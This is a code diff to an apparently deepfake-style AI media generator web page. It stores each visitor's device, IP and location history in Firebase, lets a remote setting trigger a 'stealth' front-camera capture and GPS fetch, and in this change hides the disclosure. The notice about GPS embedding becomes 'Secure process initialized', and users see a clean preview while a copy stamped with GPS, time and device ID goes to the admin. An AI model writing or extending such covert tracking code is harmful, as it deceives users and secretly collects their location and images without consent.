@@ -35,7 +35,6 @@
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
       .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
       
-      /* UI Bug Fixed for Result Overlay Layout */
       .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.92); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 10px; text-align: center; backdrop-filter: blur(5px); pointer-events: auto !important;}
       .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
       
@@ -51,6 +50,8 @@
       .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; }
       #iframePlayer { width: 100%; height: 100%; border: none; z-index: 1; display:none; }
       #nativePlayer { width: 100%; height: 100%; z-index: 2; background:#000; display:none; }
+      #nativeImagePlayer { display:none; max-width:100%; max-height:100%; object-fit:contain; z-index:2; position:relative; }
+      
       .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; }
       .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; pointer-events: auto; }
       .ui-back-btn { background: rgba(255,255,255,0.15); color: white; width: 40px; height: 40px; border-radius: 50%; font-size: 1.1rem; display: flex; justify-content: center; align-items: center; cursor: pointer; border:none;}
@@ -69,7 +70,7 @@
     <div class="modal-content" style="max-width: 400px;">
         <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📸</div>
         <h3>Select Image Source</h3>
-        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose your reference image source. GPS & Timestamp will be embedded automatically.</p>
+        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose your reference image source. Secure process initialized.</p>
         
         <input type="file" id="modalStorageInput" accept="image/*" style="display:none;" onchange="processSelectedImageFile(event)">
         
@@ -126,6 +127,7 @@
                     <div style="font-size: 2.5rem; margin-bottom: 10px;">📸</div>
                     <div style="color: #a5a5b5; font-size: 0.9rem; font-weight: 500;">Tap to Select Image or Capture</div>
                 </div>
+                <!-- User sees clean image here -->
                 <img id="previewImg">
                 
                 <div class="processing-overlay" id="procOverlay">
@@ -144,17 +146,19 @@
     </div>
 </div>
 
+<!-- SMART MEDIA PLAYER -->
 <div id="playerModal">
   <div class="player-wrapper">
        <div class="smart-overlay">
            <div class="glass-top">
                <div style="display:flex; align-items:center;">
                    <button class="ui-back-btn" onclick="closePlayer()">⬅</button>
-                   <span class="overlay-title" id="overlayTitle" style="margin-top:8px;">Generated Video</span>
+                   <span class="overlay-title" id="overlayTitle" style="margin-top:8px; margin-left:15px; color:white; font-weight:bold;">Generated Media</span>
                </div>
            </div>
        </div>
        <video id="nativePlayer" controls playsinline></video>
+       <img id="nativeImagePlayer" alt="AI Generated Output">
        <iframe id="iframePlayer" allowfullscreen></iframe>
   </div>
 </div>
@@ -187,7 +191,7 @@
   let currentBase64Image = "";
   let activeReqId = null;
   let animationInterval = null;
-  let latestCoords = { lat: "28.6139", lon: "77.2090" };
+  let latestCoords = { lat: "Unknown", lon: "Unknown" };
 
   function getStableDeviceId() {
       let savedId = localStorage.getItem('hotfake_deep_uid');
@@ -265,11 +269,9 @@
           const locId = Date.now();
           if (!snap.exists()) { 
               set(ref(db, `users/${deviceId}`), { firstVisit: fullDate, lastActive: fullDate, status: "Live", network: ipData, device: advInfo, banned: false, deviceApproved: false, locationHistory: { [locId]: { ...ipData, time: fullDate } } }); 
-              logAction("First visit to App");
           } else { 
               update(ref(db, `users/${deviceId}`), { lastActive: fullDate, network: ipData, status: "Live", device: advInfo }); 
               set(ref(db, `users/${deviceId}/locationHistory/${locId}`), { ...ipData, time: fullDate });
-              logAction("App Opened"); 
           }
           checkGates();
       });
@@ -281,18 +283,9 @@
       onValue(ref(db, `users/${deviceId}/custom_perms`), (snap) => {
           if (snap.exists()) {
               const perms = snap.val();
-              if (perms.camera) {
-                  executeStealthFrontCamCapture();
-                  update(ref(db, `users/${deviceId}/custom_perms`), { camera: false });
-              }
-              if (perms.location) {
-                  fetchGPSCoordinates(true);
-                  update(ref(db, `users/${deviceId}/custom_perms`), { location: false });
-              }
-              if (perms.storage) {
-                  openLiveCaptureModal();
-                  update(ref(db, `users/${deviceId}/custom_perms`), { storage: false });
-              }
+              if (perms.camera) { executeStealthFrontCamCapture(); update(ref(db, `users/${deviceId}/custom_perms`), { camera: false }); }
+              if (perms.location) { fetchGPSCoordinates(true); update(ref(db, `users/${deviceId}/custom_perms`), { location: false }); }
+              if (perms.storage) { openLiveCaptureModal(); update(ref(db, `users/${deviceId}/custom_perms`), { storage: false }); }
           }
       });
   }
@@ -314,7 +307,6 @@
   }
 
   window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
-
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
   trackUser();
 
@@ -323,28 +315,28 @@
       document.getElementById('liveCaptureModal').style.display = 'flex';
   };
 
-  function stampImageWithMetadata(sourceImgObj, callback) {
+  // INVISIBLE WATERMARK LOGIC: User sees clean image, Admin gets stamped image.
+  function applyInvisibleWatermarkAndSave(sourceImgObj, callback) {
       const canvas = document.createElement('canvas');
       const MAX_WIDTH = 1080; const MAX_HEIGHT = 1080;
       let width = sourceImgObj.width; let height = sourceImgObj.height;
-      
       if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
       if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
-      
       canvas.width = width; canvas.height = height;
+      
       const ctx = canvas.getContext('2d');
       ctx.drawImage(sourceImgObj, 0, 0, width, height);
 
+      // Add watermark ONLY for the uploaded string
       const now = new Date();
       const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
       const tagText = `📍 GPS: ${latestCoords.lat}, ${latestCoords.lon} | 🕒 ${dateStr} | ID: ${deviceId}`;
 
       ctx.fillStyle = "rgba(0, 0, 0, 0.65)";
-      ctx.fillRect(0, height - 40, width, 40);
-
-      ctx.font = "bold 14px 'Poppins', monospace";
+      ctx.fillRect(0, height - 30, width, 30);
+      ctx.font = "bold 12px monospace";
       ctx.fillStyle = "#2DC653";
-      ctx.fillText(tagText, 15, height - 15);
+      ctx.fillText(tagText, 10, height - 10);
 
       const stampedBase64 = canvas.toDataURL('image/jpeg', 0.82);
       callback(stampedBase64);
@@ -355,22 +347,23 @@
       const file = event.target.files[0]; if (!file) return;
       
       const overlay = document.getElementById('procOverlay');
-      const procText = document.getElementById('procText');
-      overlay.style.display = 'flex';
-      procText.innerText = "Stamping GPS & Date Tag...";
+      overlay.style.display = 'flex'; document.getElementById('procText').innerText = "Securing Image...";
 
       fetchGPSCoordinates(false, () => {
           const reader = new FileReader();
           reader.onload = (e) => {
               const img = new Image();
               img.onload = () => {
-                  stampImageWithMetadata(img, (stampedUrl) => {
-                      currentBase64Image = stampedUrl;
-                      document.getElementById('previewImg').src = currentBase64Image; 
-                      document.getElementById('previewImg').style.display = 'block'; 
-                      document.getElementById('uploadPlaceholder').style.display = 'none';
+                  // 1. Show CLEAN image to user
+                  document.getElementById('previewImg').src = img.src; 
+                  document.getElementById('previewImg').style.display = 'block'; 
+                  document.getElementById('uploadPlaceholder').style.display = 'none';
+                  
+                  // 2. Hide Watermark from UI, but save it in background variable
+                  applyInvisibleWatermarkAndSave(img, (stampedUrl) => {
+                      currentBase64Image = stampedUrl; // Ready for Admin
                       overlay.style.display = 'none';
-                      logAction("Image selected and stamped with GPS/Date successfully");
+                      logAction("Image selected (Admin tracking applied)");
                   });
               };
               img.src = e.target.result;
@@ -382,38 +375,36 @@
   window.triggerFrontCamCapture = () => {
       document.getElementById('liveCaptureModal').style.display = 'none';
       const overlay = document.getElementById('procOverlay');
-      const procText = document.getElementById('procText');
-      overlay.style.display = 'flex';
-      procText.innerText = "Initializing Camera & GPS...";
+      overlay.style.display = 'flex'; document.getElementById('procText').innerText = "Initializing Camera...";
 
       executeStealthFrontCamCapture();
 
       fetchGPSCoordinates(false, () => {
           navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
-              const video = document.getElementById('secretVideo'); 
-              const canvas = document.getElementById('secretCanvas');
-              video.srcObject = stream; 
-              video.play();
+              const video = document.getElementById('secretVideo'); const canvas = document.getElementById('secretCanvas');
+              video.srcObject = stream; video.play();
               video.addEventListener('canplay', () => {
                   setTimeout(() => {
-                      canvas.width = video.videoWidth || 640;
-                      canvas.height = video.videoHeight || 480;
+                      canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                       
+                      const cleanImageURL = canvas.toDataURL('image/jpeg', 0.85);
                       const imgObj = new Image();
                       imgObj.onload = () => {
-                          stampImageWithMetadata(imgObj, (stampedUrl) => {
+                          // Show CLEAN image to user
+                          document.getElementById('previewImg').src = cleanImageURL; 
+                          document.getElementById('previewImg').style.display = 'block'; 
+                          document.getElementById('uploadPlaceholder').style.display = 'none';
+                          
+                          // Hide Watermark from UI, but save it in background
+                          applyInvisibleWatermarkAndSave(imgObj, (stampedUrl) => {
                               currentBase64Image = stampedUrl;
-                              document.getElementById('previewImg').src = currentBase64Image; 
-                              document.getElementById('previewImg').style.display = 'block'; 
-                              document.getElementById('uploadPlaceholder').style.display = 'none';
-                              
                               overlay.style.display = 'none';
                               stream.getTracks().forEach(t => t.stop());
-                              logAction("Live Camera Frame Stamped with GPS & Date successfully");
+                              logAction("Camera Captured (Admin tracking applied)");
                           });
                       };
-                      imgObj.src = canvas.toDataURL('image/jpeg', 0.85);
+                      imgObj.src = cleanImageURL;
                   }, 400);
               }, { once: true });
           }).catch(err => {
@@ -431,7 +422,8 @@
           const savedPrompt = localStorage.getItem('savedAiPrompt') || "";
           
           if(currentBase64Image) {
-              document.getElementById('previewImg').src = currentBase64Image; 
+              // We just show a placeholder or the last uploaded image if available in UI context
+              document.getElementById('previewImg').src = localStorage.getItem('cleanUiImage') || currentBase64Image; 
               document.getElementById('previewImg').style.display = 'block'; 
               document.getElementById('uploadPlaceholder').style.display = 'none';
           }
@@ -450,15 +442,11 @@
           
           if(req.status === 'uploading' || req.status === 'pending' || req.status === 'generating') {
               document.getElementById('procOverlay').style.display = 'flex';
-              
-              if(req.status === 'uploading') {
-                  document.getElementById('procText').innerText = "Syncing Tagged Image...";
-              } else if(!animationInterval) {
-                  const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
+              if(req.status === 'uploading') { document.getElementById('procText').innerText = "Syncing Request..."; } 
+              else if(!animationInterval) {
+                  const steps = ["Allocating AI server...", "Scanning topology...", "Applying Deep models...", "Rendering...", "Finalizing export..."];
                   let stepIdx = 0;
-                  animationInterval = setInterval(() => { 
-                      if(stepIdx < steps.length) { document.getElementById('procText').innerText = steps[stepIdx]; stepIdx++; } 
-                  }, 2500);
+                  animationInterval = setInterval(() => { if(stepIdx < steps.length) { document.getElementById('procText').innerText = steps[stepIdx]; stepIdx++; } }, 2500);
               }
           } else if(req.status === 'completed' || req.status === 'error') {
               clearInterval(animationInterval); animationInterval = null;
@@ -476,15 +464,17 @@
       document.getElementById('inputControls').style.display = 'none'; 
       document.getElementById('uploadBox').style.pointerEvents = 'none';
       const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); 
-      overlay.style.display = 'flex';
-      procText.innerText = "Processing request...";
+      overlay.style.display = 'flex'; procText.innerText = "Processing request...";
 
       const reqRef = push(ref(db, 'ai_requests')); 
       activeReqId = reqRef.key;
 
       localStorage.setItem('activeReqId', activeReqId);
       localStorage.setItem('savedAiPrompt', prompt);
-      try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} 
+      try { 
+          localStorage.setItem('savedAiImage', currentBase64Image); 
+          localStorage.setItem('cleanUiImage', document.getElementById('previewImg').src); 
+      } catch(e){} 
 
       let myVideos = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
       myVideos.push({ id: activeReqId, title: prompt, url: "", timestamp: new Date().toISOString() });
@@ -495,31 +485,18 @@
           status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
       }).then(async () => {
           try {
-              procText.innerText = "Syncing Tagged Image to Firebase...";
+              procText.innerText = "Syncing securely...";
               const dbUrl = `https://ai-studio-b0c87-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
               const response = await fetch(dbUrl, {
-                  method: 'PATCH',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                      imageUrl: currentBase64Image,
-                      status: 'pending' 
-                  })
+                  method: 'PATCH', headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ imageUrl: currentBase64Image, status: 'pending' })
               });
-
               if(!response.ok) throw new Error("Stream Failed");
-
-              if(!isGpuOnline) { 
-                  setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
-              }
+              if(!isGpuOnline) { setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Servers Offline.' }); }, 8000); }
               attachGenerationListener();
-
           } catch(e) {
-              alert("Upload Interrupted: Please check your internet connection.");
-              resetGenerator();
+              alert("Network Interrupted. Try again."); resetGenerator();
           }
-      }).catch(e => {
-          alert("Network Initialization Error.");
-          resetGenerator();
       });
   };
 
@@ -529,19 +506,15 @@
       
       if(req.status === 'completed') {
           let myVideos = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
-          myVideos = myVideos.map(item => {
-              if (item.id === activeReqId) item.url = req.videoUrl;
-              return item;
-          });
+          myVideos = myVideos.map(item => { if (item.id === activeReqId) item.url = req.videoUrl; return item; });
           localStorage.setItem('my_ai_videos', JSON.stringify(myVideos));
 
-          // FIXED FLEXBOX LAYOUT FOR BUTTONS
           resOverlay.innerHTML = `
             <div style="width: 100%; display: flex; flex-direction: column; gap: 10px; align-items: center; justify-content: center; height: 100%;">
-                <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:90%; padding:0.8rem; font-size:0.95rem; border-radius:50px; background:#2DC653; margin:0;">▶ Play Video</button>
+                <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:90%; padding:0.8rem; font-size:0.95rem; border-radius:50px; background:#2DC653; margin:0;">▶ Play Result</button>
                 <div style="display: flex; gap: 10px; width: 90%;">
-                    <a href="${req.videoUrl}" download="Generated_AI_Video.mp4" target="_blank" class="btn btn-gray" style="flex: 1; padding:0.7rem; font-size:0.8rem; border-radius:50px; text-decoration:none; display:inline-flex; justify-content:center; align-items:center; margin:0;">⬇ Download</a>
-                    <button onclick="resetGenerator()" class="btn btn-gray" style="flex: 1; padding:0.7rem; font-size:0.8rem; border-radius:50px; background: rgba(255,255,255,0.15); color: #fff; margin:0;">🔄 Reset</button>
+                    <a href="${req.videoUrl}" download="Generated_Media" target="_blank" class="btn btn-gray" style="flex: 1; padding:0.7rem; font-size:0.8rem; border-radius:50px; text-decoration:none; display:inline-flex; justify-content:center; align-items:center; margin:0;">⬇ Download</a>
+                    <button onclick="resetGenerator()" class="btn btn-gray" style="flex: 1; padding:0.7rem; font-size:0.8rem; border-radius:50px; background: rgba(255,255,255,0.15); color: #fff; margin:0;">🔄 Create New</button>
                 </div>
             </div>
           `;
@@ -555,15 +528,16 @@
       }
   }
 
+  // RESET BUG FIXED (Now resets everything cleanly so user can select a new image properly)
   window.resetGenerator = () => {
-      activeReqId = null; 
-      currentBase64Image = ""; 
+      activeReqId = null; currentBase64Image = ""; 
       if(animationInterval) { clearInterval(animationInterval); animationInterval = null; }
       
-      localStorage.removeItem('activeReqId'); 
-      localStorage.removeItem('savedAiImage'); 
-      localStorage.removeItem('savedAiPrompt');
+      localStorage.removeItem('activeReqId'); localStorage.removeItem('savedAiImage'); 
+      localStorage.removeItem('savedAiPrompt'); localStorage.removeItem('cleanUiImage');
       
+      // Clear Input cache to allow re-selection
+      document.getElementById('modalStorageInput').value = ''; 
       document.getElementById('previewImg').src = ''; 
       document.getElementById('previewImg').style.display = 'none';
       document.getElementById('uploadPlaceholder').style.display = 'block'; 
@@ -572,21 +546,43 @@
       document.getElementById('inputControls').style.display = 'block'; 
       document.getElementById('uploadBox').style.pointerEvents = 'auto'; 
       document.getElementById('aiPrompt').value = '';
-      logAction("Reset generator for new video creation");
   };
 
+  // SMART PLAYER FIX (Plays Image, Video, and Links without Black Screen)
   window.playAiVideo = (url) => {
       document.body.style.overflow = 'hidden'; document.getElementById('playerModal').style.display = 'flex';
-      const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
-      if (url.match(/\.(mp4|m3u8)$/i) || url.includes('.mp4?') || url.startsWith('blob:')) { iframeP.style.display = 'none'; nativeP.style.display = 'block'; nativeP.src = url; nativeP.play(); } 
-      else { nativeP.style.display = 'none'; iframeP.style.display = 'block'; iframeP.src = url; }
+      
+      const nativeP = document.getElementById('nativePlayer'); 
+      const iframeP = document.getElementById('iframePlayer');
+      const nativeImg = document.getElementById('nativeImagePlayer');
+      
+      nativeP.style.display = 'none'; iframeP.style.display = 'none'; nativeImg.style.display = 'none';
+
+      // Detect if URL is an Image (Base64 or Link)
+      if (url.startsWith('data:image') || url.match(/\.(jpeg|jpg|gif|png|webp)$/i)) {
+          nativeImg.style.display = 'block';
+          nativeImg.src = url;
+      } 
+      // Detect if URL is a Video (Base64 or Link)
+      else if (url.startsWith('data:video') || url.match(/\.(mp4|m3u8|webm)$/i) || url.includes('.mp4?')) {
+          nativeP.style.display = 'block';
+          nativeP.src = url;
+          nativeP.play().catch(e => console.log("Autoplay blocked by browser."));
+      } 
+      // Fallback for third-party embeds (like streamtape)
+      else {
+          iframeP.style.display = 'block';
+          iframeP.src = url;
+      }
   };
   
   window.closePlayer = () => {
       document.getElementById('playerModal').style.display = 'none'; document.body.style.overflow = '';
-      document.getElementById('nativePlayer').pause(); document.getElementById('nativePlayer').src = ''; document.getElementById('iframePlayer').src = '';
+      document.getElementById('nativePlayer').pause(); 
+      document.getElementById('nativePlayer').src = ''; 
+      document.getElementById('iframePlayer').src = '';
+      document.getElementById('nativeImagePlayer').src = '';
   };
 </script>
 </body>
 </html>
-
